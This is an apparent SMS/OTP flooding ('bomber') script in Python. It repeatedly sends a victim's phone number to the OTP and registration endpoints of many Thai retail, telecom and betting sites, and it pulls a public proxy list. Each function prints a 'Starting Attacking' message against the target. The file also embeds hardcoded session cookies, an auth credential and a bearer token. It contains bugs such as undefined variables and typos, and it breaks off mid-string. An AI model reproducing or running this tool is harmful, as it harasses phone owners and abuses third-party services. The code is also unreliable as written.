from os import system
import string
import asyncio
from bs4 import BeautifulSoup
from pystyle import Colors, Colorate
from re import search
from secrets import token_hex
import requests,threading,os
from os import system
from time import sleep
from requests import Session
from time import sleep
from requests import get
from subprocess import check_output
from os import system
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from sys import stdout
from json import dumps, loads
from random import choice, randint, shuffle
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from os.path import isfile, isdir
from py_compile import compile
from os import listdir, mkdir, remove, rmdir, rename, chdir, name
from shutil import move, copy, rmtree
from time import sleep
from binascii import hexlify
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from operator import truediv
from requests import get
from concurrent.futures import ThreadPoolExecutor
from time import sleep
from subprocess import check_output
import requests as ru
import itertools
import threading
import requests
import time
import random
import datetime
import pystyle
from time import sleep
from pystyle import Colors, Colorate, Anime, Write
from requests import Session
from re import search
from concurrent.futures import ThreadPoolExecutor
from pystyle import Colors, Colorate
import random
from requests import Session
from re import search
from bs4 import BeautifulSoup as bs
from requests import Session,post,get
import threading
import time
import random
import os
import datetime
import sys
import asyncio
from re import search
from requests import Session
from re import search
from bs4 import BeautifulSoup as bs
from requests import Session,post,get
from pystyle import Colors, Colorate
import subprocess
import httpx
import sys
import time
import subprocess
import sys
import time

# info attacking
threads = 0
# _____________________

def check_system():
	if (sys.platform == "linux"):
		os.system("clear")
	else:
		print("[!] Operating systems other than linux are not supported. ")
		os._exit(0)
	
try:
	import requests
	from bs4 import BeautifulSoup as bs
	from pystyle import Colors, Colorate
except ImportError:
	os.system("pip install requests")
	os.system("pip install bs4")
	os.system("pip instapl pystyle")
	
check_system()

#os.system("clear")
headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
proxy = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text
f = open("proxy.txt", "w")
t = f.write(proxy)
g = open("proxy.txt", "r")
s = g.read().splitlines()
os.system("clear")
print(Colorate.Horizontal(Colors.green_to_yellow,"กำลังเข้าโปรแกรมรอสักครู่!!!"))
time.sleep(1.5)
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_purple,"▁  "))
time.sleep(0.5)
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ "))
time.sleep(0.5)
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ "))
time.sleep(0.5)
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄"))
time.sleep(0.5)
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅"))
time.sleep(0.5)
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅ ▆"))
time.sleep(0.5)
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_purple,"▁ ▂ ▃ ▄ ▅ ▆ ▇"))
time.sleep(1)
os.system("clear")
print(Colorate.Horizontal(Colors.blue_to_purple,"Welcome To Highzy"))
       	
bannerhighstore = """

██████╗░██╗░░░██╗
██╔══██╗╚██╗░██╔╝
██████╦╝░╚████╔╝░
██╔══██╗░░╚██╔╝░░
██████╦╝░░░██║░░░
╚═════╝░░░░╚═╝░░░
"""

def api1(target):
	global threads
	try:
		r = httpx.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": target,"password":"6302814184624az","name":target,"provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})
		submit += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass
		
def api2(target):
	global threads
	try:
		response2 = httpx.post("https://api2.1112.com/api/v1/otp/create",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36","Content-Type": "application/json"},json={"phonenumber": target,"language": "th"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTOEE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass
		
def api3(target):
	global threads
	try:
		httpx.post("https://api.1112delivery.com/api/v1/otp/create",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36","Content-Type": "application/json"},json={"phonenumber": target,"language": "th"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass

def api4(target):
	global threads
	try:
		headers = {"accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"}
		httpx.post("https://api.ypkshop.com/TOH5jkk3N031INbUepb-2SZCYIj5XGQr_xd-aSSd74s~",headers=headers,data=f"prefix=66&mobile={target}&type=1")
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass
		
def api5(target):
	global threads
	headers = {
		"Host": "shopgenix.com",
		"content-type": "application/x-www-form-urlencoded",
		"user-agent": "okhttp/3.14.9"
	}
	try:
		httpx.post("https://shopgenix.com/api/sms/otp/",headers=headers,data=f"mobile_country_id=1&mobile={target}")
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTOEE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass
		
def api6(target):
	global threads
	try:
		response = httpx.post("https://api.starzth.com/v2/token",headers={"Authorization": "Basic c2hvcDE3ODFBUEk6TVlWQmtkI2cyJmEyWSMzQGM="})
		token = response.json()['token']
		headers = {
			"authorization": "Bearer " + token,
			"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
		}
		httpx.post("https://api.starzth.com/homeshopping/v2/register/request",headers=headers,json={"username":target,"name_th":"jsjss","lastname_th":"nxnxnx","password":"as257400A","birthday":"1982-08-08","sex":"M","telephone":f"+66{target[1:]}"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass
		
def api7(target):
	global threads
	try:
		httpx.post("https://openapi.bigc.co.th/customer/v1/otp", json={"phone_no":f"{target}"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass
		
def api8(target):
	global threads
	try:
		httpx.post("https://api-sso.ch3plus.com/user/request-otp", json={"tel":f"{target}","type":"login"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass
		
def api9(target):
	global threads
	try:
		httpx.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={target}",headers={
	    "Accept": "application/json, text/plain, /",
	    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "Content-Type": "application/x-www-form-urlencoded",
	    "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
	    "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass
		
def api10(target):
	global threads
	try:
		httpx.post("https://www.konvy.com/ajax/system.php?action=get_phone_code",data=f"type=reg&phone={target}&platform=1",headers={"accept": "application/json, text/plain, text/html, text/xml, text/javascript ,image/webp, */*","content-type": "application/x-www-form-urlencoded","x-requested-with": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","cookie": "f34c_lang2=th_TH;_gcl_au=1.1.772736218.1693663780;_tt_enable_cookie=1;_ttp=dNuShIuyOWBlc6c6_g0VW_C-1ma;k_privacy_state=true;_fbp=fb.1.1693663782140.1359249614;_gid=GA1.2.496014264.1694796867;_gat_UA-28072727-2=1;PHPSESSID=rjuo4ifo49s0d04ekrk5h6bd28;_ga=GA1.1.1256061802.1693663783;_ga_Z9S47GV47R=GS1.1.1694796867.2.1.1694796880.47.0.0;cto_bundle=03x9gV9aSGdNUVFwNUd4Y0RkUzNKZkl2aiUyQlRHNDlzbURwMVdXNDlxc1dMUHM0UXk0c0hId3dFMXhodXAySTV0TjJDSEFQSU9FUmo3Zm1idHYxZldLV3ZQTUdpMThmeUtGbGROJTJGRUxmTGJpZm00ZloyVzFEdFFFeFZCZUVrdWZlT1pEUUhYck9pRUpseGMlMkJVejdON3JVaHoyRlElM0QlM0Q"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass
		
def api11(target):
	global threads
	headers = {
		"content-type": "application/json; charset=utf-8",
		"authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..L4_HNTppIThHoII_MTndvA.7f_dO0lW5BKDf0AOw9QyinAURihBdvue6G0Xkb18_UXwbM_FxAtk4gknM8kQwSX7Rhfg188UFI73nB8CNu-YPgP-il9Q-4W53yuXC3HQPnBIvGkkFAhZ2JuE8piw0fkGaOGGRvOkhpHNEdaE6jYbRg.IkvgAosR8q6-gZIQANsaqA",
		"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
		"cookie": "_vwo_uuid_v2=DEED3E33BAB6E6FD264940A38AE9770A3|f4d3bf084f98482cfae4d65b7fba48d7;_gcl_au=1.1.102477073.1693664216;__rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22XzVm9LWMCkhD9kjex4AI%22%7D;__lt__cid=ddc5d79b-b37c-47dd-b6e1-f19aedffcd71;__lt__sid=4a20fa5e-1bc444d4;_gid=GA1.2.387552209.1693664218;_gat_UA-12345-6=1;_hjSessionUser_1027858=eyJpZCI6IjJmYTEwNTdkLWExNjYtNWQzMS05OWE3LTczZjU5MTM0NjRkZSIsImNyZWF0ZWQiOjE2OTM2NjQyMTkyODQsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjIncludedInSessionSample_1027858=0;_hjSession_1027858=eyJpZCI6IjY4NTZiMTIxLWM5NzAtNDEyZS1iNWVmLTM1ODhhMGNmNmFjZCIsImNyZWF0ZWQiOjE2OTM2NjQyMTkzMDUsImluU2FtcGxlIjpmYWxzZX0=;_hjAbsoluteSessionInProgress=0;_fbp=fb.1.1693664219891.541560784;_tt_enable_cookie=1;_ttp=iIHPi-I_pJMyjSs4jgyO6N1YFcJ;_ga=GA1.2.1790770154.1693664218;cto_bundle=GcneO19nQnBDU1lxRzRzZ05BUFQ3bndkU3VDb2MxcHZkaiUyQnMlMkZzdzQzSEgxd0R3a3Y5aVIyOXBsTVg4S0poSmt3YiUyRkV3aTF3Z3NuVFYyREt2WDF5bUlMdjl2TG9rQlNlejdBUEIyZTRBTiUyRm9QcktTT3lyM3ElMkY3VENUcUxUYjVHRjVQVnBXZWE2bmF2eHQlMkI5YUxNNjJ0WWpRc1ElM0QlM0Q;_ga_QEVF0JHYKM=GS1.1.1693664218.1.1.1693664222.56.0.0;ajs_anonymous_id=4314c63d-9cc9-4477-a8e9-77bcb52a8800"
	}
	try:
		httpx.get(f"https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66{target[1:]}?lang=th&userType=BUYER&locale=th&orgIdfier=scg&phone=%2B66{target[1:]}&phoneCountryCode=%2B66&b-uid=1.0.835")
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass
		
def api12(target):
	global threads
	try:
		httpx.post("https://login.s-momclub.com/accounts.otp.sendCode",data=f"phoneNumber=%2B66{target[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Fregister%3Frefcode%3D202308-SEM-Web-CON_Sitelink%26utm_source%3Dgoogle%26utm_medium%3Dcpa%26utm_campaign%3Dweb-con_sitelink%26gclid%3DCj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB&sdkBuild=15170&format=json",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","content-type" :"application/x-www-form-urlencoded","cookie": "_gcl_au=1.1.1632048683.1693716117;_gid=GA1.2.340423765.1693716117;_fbp=fb.1.1693716117240.325276938;_tt_enable_cookie=1;_ttp=se6fwL-mYqvtITeaMxUztaCZIU_;gmid=gmid.ver4.AcbHIDVFLA.Tn8z5RwuG5o_CNr7jK6qpVxncdn8zkkU7z55uuDdWjUFfGytJe6v2dDbny3V-zOa.jQN8PgyFAldrI1mtG3ZPz3w4iwhOd5D8GHvb6Ohw-LtWWiJ1HWpCWK9-e1oTFfv5TuY8xZPxPcOyPsItrp69Rg.sc3;ucid=9tUxT7gIPCn-5LdLHwrSfw;hasGmid=ver4;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;tfpsi=fc14307e-ab83-49f4-882b-be3243eed87b;_cls_v=e77d3523-cfd8-42dd-9c01-6628062d4acf;_cls_s=f00695fd-aeb5-4b40-8bed-e4594d3d0f4f:0;_gat_UA-62402337-1=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gcl_aw=GCL.1693716220.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_gac_UA-62774158-1=1.1693716220.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_gac_UA-27534376-1=1.1693716220.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_ga=GA1.2.1260858029.1693716117;_gac_UA-62402337-1=1.1693716234.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_ga_HLYQD0DQEL=GS1.1.1693716117.1.1.1693716233.34.0.0",})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass
		
def api13(target):
	global threads
	try:
		httpx.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",json={"mobile_phone_no": target},headers={"Content-Type": "application/json"})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass
		
def api14(target):
	global threads
	try:
		ip = httpx.get("https://ipinfo.io/json").json()['ip']
		httpx.post("https://api.ak1688bet.com/member/otp/get",headers={"accept": "application/json, text/plain, */*","content-type": "application/json","authorization": "Bearer null","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36"},json={"phone":target,"ip": ip})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass
		
def api15(target):
	global threads
	try:
		httpx.post("https://ezslot.com/_ajax_/v3/register/request-otp",headers={"accept": "*/*","content-type": "Application/x-www-form-urlencoded","x-requested-with": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36","cookie": "_ga=GA1.1.583971404.1694529114;_fbp=fb.1.1694529117511.408120849;PHPSESSID=dmhs2qcdi028apt62mr1tkcdd5;_ga_WTQ1KN44EC=GS1.1.1694862154.2.0.1694862154.0.0.0"},data=f"phoneNumber={target}")
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass

def api16(terget):
		global threads
		try:
		      httpx.post("https://login.s-momclub.com/accounts.otp.sendCode",data=f"phoneNumber=%2B66{target[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Fregister%3Frefcode%3D202308-SEM-Web-CON_Sitelink%26utm_source%3Dgoogle%26utm_medium%3Dcpa%26utm_campaign%3Dweb-con_sitelink%26gclid%3DCj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB&sdkBuild=15170&format=json",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","content-type" :"application/x-www-form-urlencoded","cookie": "_gcl_au=1.1.1632048683.1693716117;_gid=GA1.2.340423765.1693716117;_fbp=fb.1.1693716117240.325276938;_tt_enable_cookie=1;_ttp=se6fwL-mYqvtITeaMxUztaCZIU_;gmid=gmid.ver4.AcbHIDVFLA.Tn8z5RwuG5o_CNr7jK6qpVxncdn8zkkU7z55uuDdWjUFfGytJe6v2dDbny3V-zOa.jQN8PgyFAldrI1mtG3ZPz3w4iwhOd5D8GHvb6Ohw-LtWWiJ1HWpCWK9-e1oTFfv5TuY8xZPxPcOyPsItrp69Rg.sc3;ucid=9tUxT7gIPCn-5LdLHwrSfw;hasGmid=ver4;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;tfpsi=fc14307e-ab83-49f4-882b-be3243eed87b;_cls_v=e77d3523-cfd8-42dd-9c01-6628062d4acf;_cls_s=f00695fd-aeb5-4b40-8bed-e4594d3d0f4f:0;_gat_UA-62402337-1=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gcl_aw=GCL.1693716220.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_gac_UA-62774158-1=1.1693716220.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_gac_UA-27534376-1=1.1693716220.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_ga=GA1.2.1260858029.1693716117;_gac_UA-62402337-1=1.1693716234.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_ga_HLYQD0DQEL=GS1.1.1693716117.1.1.1693716233.34.0.0",})
		      threads += 1
		      print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
		except:
			pass
			
def api17(target):
	global threads
	try:
		ip = httpx.get("https://ipinfo.io/json").json()['ip']
		httpx.post("https://api.ak1688bet.com/member/otp/get",headers={"accept": "application/json, text/plain, */*","content-type": "application/json","authorization": "Bearer null","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36"},json={"phone":target,"ip": ip})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass
		
def api18(target):
	global threads
	try:
		httpx.post("https://ezslot.com/_ajax_/v3/register/request-otp",headers={"accept": "*/*","content-type": "Application/x-www-form-urlencoded","x-requested-with": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36","cookie": "_ga=GA1.1.583971404.1694529114;_fbp=fb.1.1694529117511.408120849;PHPSESSID=dmhs2qcdi028apt62mr1tkcdd5;_ga_WTQ1KN44EC=GS1.1.1694862154.2.0.1694862154.0.0.0"},data=f"phoneNumber={target}")
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass
		
def api19(target):
	global threads
	try:
		ip = httpx.get("https://ipinfo.io/json").json()['ip']
		httpx.post("https://api.ak1688bet.com/member/otp/get",headers={"accept": "application/json, text/plain, */*","content-type": "application/json","authorization": "Bearer null","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36"},json={"phone":target,"ip": ip})
		threads += 1
		print(f"   \x1b[35m[\x1b[34mSTATUS-HIGHSTORE\x1b[35m] \x1b[35mStarting Attacking \x1b[00m--> {target}\x1b[36m | \x1b[32mThreads: \x1b[00m{threads}")
	except:
		pass
		
def api20(target):
	global threads
	try:
		httpx.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={target}",headers={
	    "Accept": "application/json, text/plain, /",
	    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "Content-Type": "application/x-www-form-urlencoded",
	    "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
	    "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; 